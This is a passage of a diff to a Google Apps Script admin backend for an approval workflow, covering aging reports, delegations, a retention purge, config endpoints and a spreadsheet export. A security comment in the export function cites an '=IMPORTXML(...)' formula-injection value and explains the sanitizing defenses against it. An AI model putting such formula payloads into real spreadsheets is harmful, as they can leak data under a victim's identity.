-  "who acts next", which per the append-only convention must be round-scoped — an abandoned
+  "who acts next", which per the append-only convention must be round-scoped, an abandoned
   round-1 row is not a bottleneck, it is history). One entry per session: the earliest
   outstanding step, because that is the one actually blocking the ladder.
 
   Age is measured from NOTIFIED_DATE, which the reminder engine already stamps on first
   notification and writes in clean 'YYYY-MM-DD'. Falls back to the Applications submission
   date for legacy rows that predate that column, and reports null rather than 0 when neither
-  parses — an unknown age must never masquerade as a fresh one.
+  parses, an unknown age must never masquerade as a fresh one.
 
   🚩 Cross-checked against the reminder engine on purpose: a request that appears here at
   12 days but was never nudged means the reminder trigger is not running. That divergence is
@@ -2184,14 +2190,14 @@ var AGING_BUCKETS = [
                { sessionId, reqId, stage, approverName, approverEmail, step, days, notified }
 
   STEPS
-    Step 1 — Build the set of sessions still awaiting a human (skip terminal ones).
+    Step 1: Build the set of sessions still awaiting a human (skip terminal ones).
       Layman    : huwag nang bilangin yung tapos na o na-deny.
       Technical : Applications.Status ∈ AGING_LIVE_STATUSES.
-    Step 2 — Walk the three workflow sheets, keeping current-round Pending rows only.
+    Step 2: Walk the three workflow sheets, keeping current-round Pending rows only.
       Layman    : hanapin kung sino ang hinihintay ngayon.
       Technical : keepCurrentRoundRows_ per session, then filter Status === 'Pending'.
-    Step 3 — One winner per session: lowest step wins (it blocks the rest).
-    Step 4 — Age each winner, bucket it, and sort oldest first.
+    Step 3: One winner per session: lowest step wins (it blocks the rest).
+    Step 4: Age each winner, bucket it, and sort oldest first.
 
   EXAMPLE
     getAgingReport_()
@@ -2231,7 +2237,7 @@ function getAgingReport_() {
     try {
       rows = sheetToObjects_(getSheet_(st.sheet));
     } catch (eSheet) {
-      Logger.log('getAgingReport_: skipping ' + st.sheet + ' — ' + eSheet);
+      Logger.log('getAgingReport_: skipping ' + st.sheet + ': ' + eSheet);
       continue;   // a missing optional workflow sheet must not blank the whole report
     }
 
@@ -2278,8 +2284,8 @@ function getAgingReport_() {
     var it = bySession[k];
     var d = daysSince_(it.notified);
     if (d === null) {
-      // Legacy row from before NotifiedDate existed — fall back to when the PIA was submitted.
-      // Header is 'SubmissionDate' (no underscore) — verified against initializeDatabase_ in
+      // Legacy row from before NotifiedDate existed, fall back to when the PIA was submitted.
+      // Header is 'SubmissionDate' (no underscore), verified against initializeDatabase_ in
       // pia_code.js, which is the authoritative writer of this sheet's header row.
       d = daysSince_(apps[k] ? apps[k].SubmissionDate : null);
     }
@@ -2307,7 +2313,7 @@ function getAgingReport_() {
   }
 
   return {
-    ok: true, success: true,
+    ok: true,
     buckets: buckets,
     items: items,
     totalPending: items.length,
@@ -2337,7 +2343,7 @@ function adminApi_getAgingReport() {
 }
 
 // ════════════════════════════════════════════════════════════════════════════════════
-//  DELEGATION / OUT-OF-OFFICE  —  the ISM-facing CRUD half
+//  DELEGATION / OUT-OF-OFFICE, the ISM-facing CRUD half
 // ════════════════════════════════════════════════════════════════════════════════════
 /*
   ━━━ WHAT THIS IS, AND WHERE THE REST OF IT LIVES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -2348,7 +2354,7 @@ function adminApi_getAgingReport() {
              the review links for the delegate, and records who really clicked lives in PIA
              (resolveDelegate_ / canActAs_ / recipientFor_ in Phase 2/pia_code.js).
 
-  🚩 ONLY ISM CAN CREATE A DELEGATION — approvers cannot appoint their own stand-in. That is
+  🚩 ONLY ISM CAN CREATE A DELEGATION, approvers cannot appoint their own stand-in. That is
      a security decision, not a UI shortcut: self-service would let any approver quietly route
      their own approvals to a colleague of their choosing.
 
@@ -2356,7 +2362,7 @@ function adminApi_getAgingReport() {
              but they share one spreadsheet, which is the whole integration model here. So
              Admin reads and writes the Delegations tab directly rather than proxying through
              PIA's doPost API. The column order below MUST stay in step with DELEGATION_COLS
-             in pia_code.js — that is the cross-app contract for this table.
+             in pia_code.js, that is the cross-app contract for this table.
 
   ⚠️ A delegation is single-hop and is NOT retroactive. Emails already sent keep pointing at
      the original approver, because a review link is signed at send time. Creating a
@@ -2391,7 +2397,7 @@ function getDelegationsSheetAdmin_() {
   LAYMAN:    Binabasa ng Settings page yung listahan ng mga kapalit.
   TECHNICAL: checkAccess_-gated read. Dates are stringified because google.script.run cannot
              serialize a Date, and `active` is precomputed server-side so the UI does not have
-             to re-implement the date-window rule that resolveDelegate_ already owns — two
+             to re-implement the date-window rule that resolveDelegate_ already owns, two
              implementations of "is this in effect right now" would inevitably disagree.
   PARAMS:    (none)
   RETURNS:   {ok:true, data:[{id,from,to,start,end,reason,isActive,active,createdBy}]}
@@ -2421,7 +2427,7 @@ function adminApi_getDelegations() {
         createdBy: String(r.Created_By || '')
       };
     });
-    return { ok: true, success: true, data: out };
+    return { ok: true, data: out };
   } catch (e) { return safeError_(e, ERR.INTERNAL, 'The delegation list could not be loaded.'); }
 }
 
@@ -2438,14 +2444,14 @@ function adminApi_getDelegations() {
     - both addresses present, on the allowed domain, and different from each other
     - end >= start when both are supplied
   Domain is checked with the same isAuthorizedDomain_ used by every other gate, so a
-  delegation cannot be used to route an approval link to an outside address — which is the
+  delegation cannot be used to route an approval link to an outside address, which is the
   one genuinely dangerous thing this table could otherwise do.
 
   Writes an audit row on every change. A delegation quietly appearing is exactly the kind of
   thing an auditor needs to be able to reconstruct.
 
   PARAMS:
-  - d — { id?, from, to, start?, end?, reason?, isActive? }. A blank id creates a new row.
+  - d: { id?, from, to, start?, end?, reason?, isActive? }. A blank id creates a new row.
 
   RETURNS:
   {ok:true, id, message} or a validation/failure envelope.
@@ -2492,7 +2498,7 @@ function adminApi_saveDelegation(d) {
             String(data[i][hdr.indexOf('Created_At')] || new Date().toISOString())
           ]]);
           logAuditTrail_('SYSTEM', 'Delegation Updated', { id: id, from: from, to: to, start: start, end: end, isActive: isActive });
-          return { ok: true, success: true, id: id, message: 'Delegation updated.' };
+          return { ok: true, id: id, message: 'Delegation updated.' };
         }
       }
       return fail_(ERR.NOT_FOUND, 'That delegation no longer exists. Reload and try again.');
@@ -2501,7 +2507,7 @@ function adminApi_saveDelegation(d) {
     id = 'DEL-' + Utilities.getUuid().slice(0, 8).toUpperCase();
     sheet.appendRow([id, from, to, start, end, reason, isActive, me, new Date().toISOString()]);
     logAuditTrail_('SYSTEM', 'Delegation Created', { id: id, from: from, to: to, start: start, end: end, isActive: isActive });
-    return { ok: true, success: true, id: id, message: 'Delegation saved.' };
+    return { ok: true, id: id, message: 'Delegation saved.' };
 
   } catch (e) { return safeError_(e, ERR.INTERNAL, 'The delegation could not be saved.'); }
 }
@@ -2514,7 +2520,7 @@ function adminApi_saveDelegation(d) {
              real delete rather than a soft flag: Is_Active already exists as the "pause it"
              control, so a second tombstone state would just be a way for a stale row to
              surprise someone later.
-  PARAMS:    - id — the Delegation_ID.
+  PARAMS:    - id: the Delegation_ID.
   RETURNS:   {ok:true, message} or a failure envelope.
 */
 function adminApi_deleteDelegation(id) {
@@ -2531,7 +2537,7 @@ function adminApi_deleteDelegation(id) {
       if (String(data[i][idIdx] || '').trim() === target) {
         sheet.deleteRow(i + 1);
         logAuditTrail_('SYSTEM', 'Delegation Removed', { id: target });
-        return { ok: true, success: true, message: 'Delegation removed.' };
+        return { ok: true, message: 'Delegation removed.' };
       }
     }
     return fail_(ERR.NOT_FOUND, 'That delegation no longer exists.');
@@ -2539,7 +2545,7 @@ function adminApi_deleteDelegation(id) {
 }
 
 // ════════════════════════════════════════════════════════════════════════════════════
-//  RETENTION & PURGE  —  ships INERT. Read the block below before enabling anything.
+//  RETENTION & PURGE: ships INERT. Read the block below before enabling anything.
 // ════════════════════════════════════════════════════════════════════════════════════
 /*
   ━━━ WHY THIS EXISTS, AND WHY IT IS SWITCHED OFF ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -2569,7 +2575,7 @@ function adminApi_deleteDelegation(id) {
 
   🚩 IT LIVES IN ADMIN, NOT PHASE 1, and that is not arbitrary. A scheduled job needs
   script.scriptapp to install its own trigger, and a Drive purge needs the drive scope.
-  Admin already holds both. Phase 1 holds NEITHER — putting it there would mean a new
+  Admin already holds both. Phase 1 holds NEITHER, putting it there would mean a new
   manifest scope and a forced re-authorization of the DCS app for every user. Phase 2 also
   qualifies, but Admin is where ISM already administers everything else.
 
@@ -2583,7 +2589,7 @@ function adminApi_deleteDelegation(id) {
       took eight months to approve does not get purged eight months early.
     - Per-run cap (RETENTION_MAX_PER_RUN) keeps a sweep inside the 6-minute execution limit,
       the same reason PIA's reminder engine caps at 300 rows.
-    - Every run — dry or live — appends one summary row to Risk_Audit. A purge that leaves
+    - Every run: dry or live, appends one summary row to Risk_Audit. A purge that leaves
       no trace is indistinguishable from data loss.
     - Drive files are TRASHED (setTrashed), not hard-deleted, so there is a 30-day window.
 */
@@ -2592,7 +2598,7 @@ var RETENTION_DEFAULT_MONTHS = 24;
 var RETENTION_MAX_PER_RUN    = 200;   // sessions per sweep; keeps us inside the 6-min limit
 
 // A request is only ever eligible once it has reached one of these. Anything else is still
-// live — someone is waiting on it — and is skipped regardless of age.
+// live, someone is waiting on it, and is skipped regardless of age.
 var RETENTION_TERMINAL_PIA = ['Approved by ISM', 'Denied', 'Rejected by ISM', 'Rejected'];
 var RETENTION_TERMINAL_DCS = ['COMPLETE', 'REJECTED'];
 
@@ -2600,7 +2606,7 @@ var RETENTION_TERMINAL_DCS = ['COMPLETE', 'REJECTED'];
   Function: getRetentionConfig_
   LAYMAN:    Binabasa yung tatlong setting sa System_Configuration. Kung wala pa yung rows,
              ibinabalik yung ligtas na default: PATAY, at dry-run.
-  TECHNICAL: Fails SAFE in every direction — a missing sheet, a missing key, or an
+  TECHNICAL: Fails SAFE in every direction, a missing sheet, a missing key, or an
              unparseable number all resolve to enabled:false / dryRun:true. The only way to
              get a live delete is for both keys to be explicitly and correctly set.
   PARAMS:    (none)
@@ -2621,7 +2627,7 @@ function getRetentionConfig_() {
       }
     }
   } catch (e) {
-    Logger.log('getRetentionConfig_: could not read config, failing safe (disabled) — ' + e);
+    Logger.log('getRetentionConfig_: could not read config, failing safe (disabled): ' + e);
     return { enabled: false, months: RETENTION_DEFAULT_MONTHS, dryRun: true };
   }
   return cfg;
@@ -2633,35 +2639,35 @@ function getRetentionConfig_() {
   LAYMAN (Tropang Ex):
   Ang ginagawa niya, in order: (1) titignan kung bukas ba talaga ang switch, (2) hahanapin
   lahat ng request na TAPOS NA at lumampas na sa itinakdang buwan, (3) bibilangin kung ilang
-  row at kung ilang file ang tatanggalin, at (4) kung dry run — tapos na, nagre-report lang.
+  row at kung ilang file ang tatanggalin, at (4) kung dry run, tapos na, nagre-report lang.
   Kung hindi dry run, saka lang siya bubura, mula sa ilalim paakyat para hindi mag-shift ang
   mga row number.
 
   TECHNICAL:
   Eligibility is computed per SESSION, not per row, so a request is removed as a unit across
-  all seven surfaces or not at all — a half-purged request is worse than an unpurged one.
+  all seven surfaces or not at all, a half-purged request is worse than an unpurged one.
 
   The terminal DATE is max(DecisionDate) across that session's workflow rows, falling back to
   the DCS Timestamp. Measuring from submission instead would purge a slow-moving request
   early; measuring from "now minus N" without a terminal date at all would purge live ones.
 
   PARAMS:
-  - opts — { forceDryRun:boolean } to force a report-only run regardless of config. The
+  - opts: { forceDryRun:boolean } to force a report-only run regardless of config. The
            Admin UI button always passes true.
 
   RETURNS:
   { ok, enabled, dryRun, months, cutoff, eligibleSessions, rowsRemoved, filesTrashed,
-    draftsRemoved, capped, sample:[…], skippedLive } — plus the standard failure envelope
+    draftsRemoved, capped, sample:[…], skippedLive }, plus the standard failure envelope
   on a hard error.
 
   STEPS
-    Step 1 — Read config; bail immediately unless explicitly enabled.
+    Step 1: Read config; bail immediately unless explicitly enabled.
       Layman    : kung nakapatay, wala talagang mangyayari.
       Technical : returns { enabled:false } without reading a single data sheet.
-    Step 2 — Build the eligible session set from Applications + Data_Collection.
+    Step 2: Build the eligible session set from Applications + Data_Collection.
       Technical : terminal status AND terminal date older than the cutoff.
-    Step 3 — Count what would go, across all seven surfaces.
-    Step 4 — If live, delete bottom-up per sheet, trash Drive files, then log the summary.
+    Step 3: Count what would go, across all seven surfaces.
+    Step 4: If live, delete bottom-up per sheet, trash Drive files, then log the summary.
       Technical : bottom-up because deleteRow shifts every row beneath it.
 
   EXAMPLE
@@ -2676,7 +2682,7 @@ function runRetentionSweep_(opts) {
   var dryRun = forceDry || cfg.dryRun;
 
   if (!cfg.enabled && !forceDry) {
-    return { ok: true, success: true, enabled: false, dryRun: true, months: cfg.months,
+    return { ok: true, enabled: false, dryRun: true, months: cfg.months,
              message: 'Retention is disabled (RETENTION_ENABLED is not TRUE). Nothing was scanned.' };
   }
 
@@ -2684,7 +2690,7 @@ function runRetentionSweep_(opts) {
   cutoff.setMonth(cutoff.getMonth() - cfg.months);
 
   var report = {
-    ok: true, success: true, enabled: cfg.enabled, dryRun: dryRun, months: cfg.months,
+    ok: true, enabled: cfg.enabled, dryRun: dryRun, months: cfg.months,
     cutoff: Utilities.formatDate(cutoff, Session.getScriptTimeZone(), 'yyyy-MM-dd'),
     eligibleSessions: 0, skippedLive: 0, rowsRemoved: 0, filesTrashed: 0,
     draftsRemoved: 0, capped: false, sample: []
@@ -2778,7 +2784,7 @@ function runRetentionSweep_(opts) {
     report.rowsRemoved += deleteRowsWhere_(SHEET_NAMES.APP_SNAPSHOTS,      'SessionID', sessionSet);
     report.rowsRemoved += deleteRowsWhere_(SHEET_NAMES.DATA_COLLECTION,   'ReqID',     reqSet);
 
-    // Email_Queue and Risk_Audit are purged by AGE, not by session — they accumulate rows
+    // Email_Queue and Risk_Audit are purged by AGE, not by session, they accumulate rows
     // for requests that no longer exist, and Email_Queue stores whole rendered email bodies.
     report.rowsRemoved += deleteRowsOlderThan_(SHEET_NAMES.EMAIL_QUEUE, 'Created_At', cutoff);
     report.rowsRemoved += deleteRowsOlderThan_(SHEET_NAMES.RISK_AUDIT, 'Timestamp', cutoff);
@@ -2808,8 +2814,8 @@ function runRetentionSweep_(opts) {
   TECHNICAL: Bottom-up deleteRow over a header-resolved key column. A missing sheet or a
              missing column is logged and skipped rather than thrown, so one absent optional
              tab cannot abort a sweep that has already trashed Drive files.
-  PARAMS:    - sheetName — tab to purge.  - keyCol — header name to match on.
-             - idSet — object used as a set of matching values.
+  PARAMS:    - sheetName: tab to purge.  - keyCol: header name to match on.
+             - idSet: object used as a set of matching values.
   RETURNS:   Count of rows deleted.
 */
 function deleteRowsWhere_(sheetName, keyCol, idSet) {
@@ -2822,7 +2828,7 @@ function deleteRowsWhere_(sheetName, keyCol, idSet) {
   if (!data || data.length < 2) return 0;
   var idx = data[0].indexOf(keyCol);
   if (idx === -1) {
-    Logger.log('deleteRowsWhere_: ' + sheetName + ' has no column "' + keyCol + '" — skipping.');
+    Logger.log('deleteRowsWhere_: ' + sheetName + ' has no column "' + keyCol + '", skipping.');
     return 0;
   }
   var n = 0;
@@ -2837,7 +2843,7 @@ function deleteRowsWhere_(sheetName, keyCol, idSet) {
   LAYMAN:    Katulad ng nasa itaas, pero petsa ang basehan, hindi ID. Para sa mga log at
              email queue na patuloy na lumalaki kahit wala nang kaugnay na request.
   TECHNICAL: Bottom-up deleteRow where parseAnyDate_(row[dateCol]) < cutoff. Rows with an
-             unparseable date are KEPT — an unreadable timestamp is not evidence of age.
+             unparseable date are KEPT: an unreadable timestamp is not evidence of age.
   PARAMS:    - sheetName, dateCol, cutoff (Date).
   RETURNS:   Count of rows deleted.
 */
@@ -2851,7 +2857,7 @@ function deleteRowsOlderThan_(sheetName, dateCol, cutoff) {
   if (!data || data.length < 2) return 0;
   var idx = data[0].indexOf(dateCol);
   if (idx === -1) {
-    Logger.log('deleteRowsOlderThan_: ' + sheetName + ' has no column "' + dateCol + '" — skipping.');
+    Logger.log('deleteRowsOlderThan_: ' + sheetName + ' has no column "' + dateCol + '", skipping.');
     return 0;
   }
   var n = 0;
@@ -2865,13 +2871,13 @@ function deleteRowsOlderThan_(sheetName, dateCol, cutoff) {
 /*
   Function: trashRequestFiles_
   LAYMAN:    Inilalagay sa Drive trash yung mga na-upload na dokumento ng isang request
-             (NDA, DPA, DSA, at iba pa). Trash, hindi tuluyang bura — may 30 araw pang
+             (NDA, DPA, DSA, at iba pa). Trash, hindi tuluyang bura, may 30 araw pang
              pagkakataong mabawi kung may namali.
   TECHNICAL: Walks the FILE_ID JSON blob (the same shape apiDownloadDcsFile validates
              against), collecting any string that looks like a Drive id, and setTrashed(true)
-             on each. Individual failures are logged and skipped — a file already deleted by
+             on each. Individual failures are logged and skipped, a file already deleted by
              hand must not abort the sweep.
-  PARAMS:    - fileIdJson — the Data_Collection FileID cell (JSON object, or a bare id).
+  PARAMS:    - fileIdJson: the Data_Collection FileID cell (JSON object, or a bare id).
   RETURNS:   Count of files successfully trashed.
 */
 function trashRequestFiles_(fileIdJson) {
@@ -2892,7 +2898,7 @@ function trashRequestFiles_(fileIdJson) {
   var n = 0;
   for (var i = 0; i < ids.length; i++) {
     try { DriveApp.getFileById(ids[i]).setTrashed(true); n++; }
-    catch (eFile) { Logger.log('trashRequestFiles_: could not trash ' + ids[i] + ' — ' + eFile); }
+    catch (eFile) { Logger.log('trashRequestFiles_: could not trash ' + ids[i] + ': ' + eFile); }
   }
   return n;
 }
@@ -2902,7 +2908,7 @@ function trashRequestFiles_(fileIdJson) {
 
   LAYMAN (Tropang Ex):
   Meron nang code sa Phase 1 na dapat nagbubura ng expired drafts araw-araw... pero HINDI
-  SIYA KAILANMAN NA-SCHEDULE. Hindi kasi kayang gumawa ng trigger ang Phase 1 — wala siyang
+  SIYA KAILANMAN NA-SCHEDULE. Hindi kasi kayang gumawa ng trigger ang Phase 1, wala siyang
   script.scriptapp na scope. Kaya lazy lang siya: nabubura lang ang expired draft kapag may
   nagkataong nagbasa ng sheet. Dito na natin siya inilagay, kasi may scope si Admin.
 
@@ -2911,7 +2917,7 @@ function trashRequestFiles_(fileIdJson) {
   passed, bottom-up.
 
   🚩 One correctness note the Phase 1 version got wrong: DCS and PIA SHARE the Drafts sheet,
-  discriminated by a Type column, and Phase 1's version filtered on ExpiresAt only — so it
+  discriminated by a Type column, and Phase 1's version filtered on ExpiresAt only, so it
   would happily delete PIA drafts too. Harmless while both TTLs are 7 days, a silent
   cross-app data loss the moment they diverge. This version is TTL-agnostic (it trusts each
   app's own stored ExpiresAt) which is correct for both, and it counts per type so the log
@@ -2939,18 +2945,18 @@ function purgeExpiredDraftsFromAdmin_() {
     sheet.deleteRow(i + 1);
     n++;
   }
-  if (n > 0) Logger.log('purgeExpiredDraftsFromAdmin_: removed ' + n + ' expired draft(s) — ' + JSON.stringify(byType));
+  if (n > 0) Logger.log('purgeExpiredDraftsFromAdmin_: removed ' + n + ' expired draft(s): ' + JSON.stringify(byType));
   return n;
 }
 
 /*
   Function: runRetentionSweep
   LAYMAN:    Ito yung pinapatakbo ng buwanang trigger. Hindi ito matatawag ng kahit sinong
-             user mula sa browser — owner o trigger lang.
+             user mula sa browser, owner o trigger lang.
   TECHNICAL: Public because a time-driven trigger binds its handler by NAME STRING
              (ScriptApp.newTrigger('runRetentionSweep')), so it cannot take a trailing
              underscore without silently orphaning the installed trigger. Guarded with
-             isOwnerContext_() instead — the same convention PIA uses for sendDailyReminders.
+             isOwnerContext_() instead, the same convention PIA uses for sendDailyReminders.
              Thin wrapper over the private implementation so internal callers can bypass it.
   PARAMS:    (none)
   RETURNS:   The sweep report, or an authorization failure.
@@ -2963,7 +2969,7 @@ function runRetentionSweep() {
 /*
   Function: setupRetentionTrigger
   LAYMAN:    Ginagawa yung buwanang schedule. Ligtas patakbuhin kahit nakapatay pa ang
-             retention — magpapatakbo lang siya ng sweep na walang gagawin.
+             retention, magpapatakbo lang siya ng sweep na walang gagawin.
   TECHNICAL: Deletes any existing runRetentionSweep trigger first (dedupe, mirroring
              setupEmailQueueTrigger's pattern in PIA), then installs a monthly one.
              Requires script.scriptapp, which Admin's manifest already has.
@@ -2977,8 +2983,8 @@ function setupRetentionTrigger() {
     if (triggers[i].getHandlerFunction() === 'runRetentionSweep') ScriptApp.deleteTrigger(triggers[i]);
   }
   ScriptApp.newTrigger('runRetentionSweep').timeBased().onMonthDay(1).atHour(2).create();
-  Logger.log('Retention trigger installed — runRetentionSweep() runs on the 1st at ~2am.');
-  return { ok: true, success: true,
+  Logger.log('Retention trigger installed, runRetentionSweep() runs on the 1st at ~2am.');
+  return { ok: true,
            message: 'Monthly retention trigger installed. It stays a no-op until RETENTION_ENABLED is TRUE.' };
 }
 
@@ -2993,7 +2999,7 @@ function adminApi_getRetentionConfig() {
   var _authz = checkAccess_(Session.getActiveUser().getEmail());
   if (!_authz.allowed) return fail_(ERR.FORBIDDEN, _authz.reason);
   try {
-    return { ok: true, success: true, data: getRetentionConfig_() };
+    return { ok: true, data: getRetentionConfig_() };
   } catch (e) { return safeError_(e, ERR.INTERNAL); }
 }
 
@@ -3005,7 +3011,7 @@ function adminApi_getRetentionConfig() {
              mutate → single setValues → appendRow-for-missing-keys pattern as
              adminApi_setNotificationConfig. Months is clamped to 1..120: a zero or negative
              value would set the cutoff to now-or-later and make everything eligible at once.
-  PARAMS:    - config — {enabled?:boolean, months?:number, dryRun?:boolean}
+  PARAMS:    - config: {enabled?:boolean, months?:number, dryRun?:boolean}
   RETURNS:   {ok:true, message} or a failure envelope.
 */
 function adminApi_setRetentionConfig(config) {
@@ -3040,13 +3046,13 @@ function adminApi_setRetentionConfig(config) {
     for (var uk in updates) { if (!existing[uk]) sysSheet.appendRow([uk, updates[uk]]); }
 
     logAuditTrail_('SYSTEM', 'Retention Config Changed', updates);
-    return { ok: true, success: true, message: 'Retention settings saved.' };
+    return { ok: true, message: 'Retention settings saved.' };
   } catch (e) { return safeError_(e, ERR.INTERNAL); }
 }
 
 /*
   Function: adminApi_runRetentionDryRun
-  LAYMAN:    Yung "Preview" button sa Settings. LAGING dry run — kahit anong setting, hindi
+  LAYMAN:    Yung "Preview" button sa Settings. LAGING dry run, kahit anong setting, hindi
              siya nagbubura. Para makita muna ng ISM kung ano ang mawawala bago sila pumayag.
   TECHNICAL: checkAccess_-gated, and passes forceDryRun:true unconditionally so this endpoint
              can never delete regardless of RETENTION_DRY_RUN's stored value. The live sweep
@@ -3071,22 +3077,22 @@ function adminApi_runRetentionDryRun() {
              union of dcsData/piaData keys (dropping FileID and a few ID/Status cols),
              writes one row per record (formatExportCell pretty-prints JSON cells),
              auto-resizes, and relocates the file into the source DB's Drive folder.
-  PARAMS:    - rows — the dashboard rows array (or its JSON string).
-  RETURNS:   {success:true, url, sheetName} or {success:false, error}.
+  PARAMS:    - rows: the dashboard rows array (or its JSON string).
+  RETURNS:   {ok: true, url, sheetName} or {ok: false, message}.
 
-  🚩 SECURITY — THIS IS THE FORMULA-INJECTION SINK OF THE WHOLE SYSTEM. Everywhere else
+  🚩 SECURITY: THIS IS THE FORMULA-INJECTION SINK OF THE WHOLE SYSTEM. Everywhere else
   user text is read back through code, where "=IMPORTXML(...)" is an inert string. Here
   it lands in a Spreadsheet a human OPENS, so it evaluates under the admin's own Google
-  identity. Both defenses live in Step 3 — do not remove either, and do not move the
+  identity. Both defenses live in Step 3: do not remove either, and do not move the
   sanitize call inside formatExportCell (that path never sees the 10 base fields).
   Note also that formatExportCell AMPLIFIES the exposure: it explodes JSON blobs into
   "key: value" lines, so values normally inert behind a leading "{" get unpacked.
 
   STEPS
-    Step 1 — Parse input; bail if empty.
-    Step 2 — Create sheet; compute the union header set.
-    Step 3 — Force plain-text format, then append a sanitized row per record.
-    Step 4 — Move the export file beside the source database.
+    Step 1: Parse input; bail if empty.
+    Step 2: Create sheet; compute the union header set.
+    Step 3: Force plain-text format, then append a sanitized row per record.
+    Step 4: Move the export file beside the source database.
 */
 // ─── exportToSheet() ───────────────────────────────────────────────────────────
 function exportToSheet(rows) {
@@ -3095,10 +3101,10 @@ function exportToSheet(rows) {
   // apiAdmin_* families and missed this one.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     var parsed = (typeof rows === 'string') ? JSON.parse(rows) : rows;
-    if (!parsed || !parsed.length) return { ok: false, success: false, error: 'No rows to export.' };
+    if (!parsed || !parsed.length) return { ok: false, message: 'No rows to export.' };
 
     var ss = SpreadsheetApp.create('PIA Admin Export - ' + new Date().toISOString().slice(0, 10));
     var sheet = ss.getActiveSheet();
@@ -3135,7 +3141,7 @@ function exportToSheet(rows) {
     // and becomes a formula running under the admin's own identity. Two defenses, both
     // cheap: force the whole sheet to plain-text format, and apostrophe-prefix every
     // risky string at the appendRow boundary (see sanitizeCellValue_). The boundary is
-    // the right place — sanitizing inside formatExportCell would miss the 10 base fields.
+    // the right place, sanitizing inside formatExportCell would miss the 10 base fields.
     sheet.getRange(1, 1, sheet.getMaxRows(), sheet.getMaxColumns()).setNumberFormat('@');
 
     sheet.appendRow(headers.map(sanitizeCellValue_));
@@ -3189,9 +3195,9 @@ function exportToSheet(rows) {
       DriveApp.getRootFolder().removeFile(exportFile);
     } catch (e) {}
 
-    return { ok: true, success: true, url: ss.getUrl(), sheetName: sheet.getName() };
+    return { ok: true, url: ss.getUrl(), sheetName: sheet.getName() };
   } catch (e) {
-    return { ok: false, success: false, error: 'exportToSheet: ' + e.message };
+    return safeError_(e, ERR.INTERNAL);
   }
 }
 
@@ -3202,14 +3208,14 @@ function exportToSheet(rows) {
   TECHNICAL: Reads System_Configuration and InfoSec_Email_Config via sheetToObjects_;
              missing sheets degrade to [].
   PARAMS:    (none)
-  RETURNS:   {success:true, sys:[...], info:[...]} or {success:false, error}.
+  RETURNS:   {ok: true, sys:[...], info:[...]} or {ok: false, message}.
 */
 // ─── CONFIGURATION SETTINGS ────────────────────────────────────────────────────
 function getConfigData() {
-  // SECURITY (F-01): re-authorize the caller server-side — config reads must be gated.
+  // SECURITY (F-01): re-authorize the caller server-side, config reads must be gated.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
 
   try {
     var ss = getSpreadsheet_();
@@ -3220,35 +3226,35 @@ function getConfigData() {
     var sysData = sysSheet ? sheetToObjects_(sysSheet) : [];
     var infoData = infoSheet ? sheetToObjects_(infoSheet) : [];
     
-    return { ok: true, success: true, sys: sysData, info: infoData };
+    return { ok: true, sys: sysData, info: infoData };
   } catch (e) {
-    return { ok: false, success: false, error: 'getConfigData: ' + e.message };
+    return safeError_(e, ERR.INTERNAL);
   }
 }
 
 /*
   Function: saveConfigData
-  LAYMAN:    Saves edits from the Admin Settings page back to both config tables —
+  LAYMAN:    Saves edits from the Admin Settings page back to both config tables,
              updating rows that exist and adding rows for brand-new keys or members
              (e.g. a new LINK_* template link, or an added INFOSEC-003).
   TECHNICAL: For System_Configuration, rewrites Value cells for keys present in
              sysUpdates, then appendRow for new non-empty keys (filling a Description
              column if present). For InfoSec_Email_Config, updates Member_Name/Email by
              Member_ID, then appends new members (defaulting Role/IsActive columns).
-  PARAMS:    - sysUpdates — {Configuration_Key: value, ...}.
-             - infoUpdates — {Member_ID: {name, email}, ...}.
-  RETURNS:   {success:true} or {success:false, error}.
+  PARAMS:    - sysUpdates: {Configuration_Key: value, ...}.
+             - infoUpdates: {Member_ID: {name, email}, ...}.
+  RETURNS:   {ok: true,} or {ok: false, message}.
 
   STEPS
-    Step 1 — Update + append System_Configuration rows.
-    Step 2 — Update + append InfoSec_Email_Config rows.
+    Step 1: Update + append System_Configuration rows.
+    Step 2: Update + append InfoSec_Email_Config rows.
 */
 function saveConfigData(sysUpdates, infoUpdates) {
   // SECURITY (F-01/F-03): re-authorize the caller server-side. Without this, any domain user could call
   // saveConfigData directly to tamper config or add themselves to InfoSec_Email_Config (privilege escalation).
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
 
   try {
     var ss = getSpreadsheet_();
@@ -3330,9 +3336,9 @@ function saveConfigData(sysUpdates, infoUpdates) {
         }
       }
     }
-    return { ok: true, success: true };
+    return { ok: true };
   } catch (e) {
-    return { ok: false, success: false, error: 'saveConfigData: ' + e.message };
+    return safeError_(e, ERR.INTERNAL);
   }
 }
 
@@ -3341,7 +3347,7 @@ function saveConfigData(sysUpdates, infoUpdates) {
   LAYMAN:    Lets the AdminView template pull in another HTML file inline (partials).
   TECHNICAL: Returns the raw content of another HtmlService file; called from
              <?!= include('name') ?> in the template.
-  PARAMS:    - filename — partial file name (no extension).
+  PARAMS:    - filename: partial file name (no extension).
   RETURNS:   HTML string.
 */
 // ─── Utility: Include HTML partials ────────────────────────────────────────────
@@ -3349,7 +3355,7 @@ function include(filename) {
   return HtmlService.createHtmlOutputFromFile(filename).getContent();
 }
 
-// ─── CERTIFICATE ROUTING — Admin API ──────────────────────────────────────────
+// ─── CERTIFICATE ROUTING: Admin API ──────────────────────────────────────────
 // These functions let an ISM admin regenerate the Certificate of Approval and
 // resend the routing email to DCOPS, TechServe, or Both.
 // ───────────────────────────────────────────────────────────────────────────────
@@ -3361,8 +3367,8 @@ function include(filename) {
   TECHNICAL: Returns a complete <html> document string with an inline <style> block
              (navy palette, DM Sans/Mono, card + alert styles) and the supplied
              header/body injected into a .card.
-  PARAMS:    - headerContent — HTML for the badge + title area.
-             - bodyContent — HTML for the card body.
+  PARAMS:    - headerContent: HTML for the badge + title area.
+             - bodyContent: HTML for the card body.
   RETURNS:   Full HTML document string.
 */
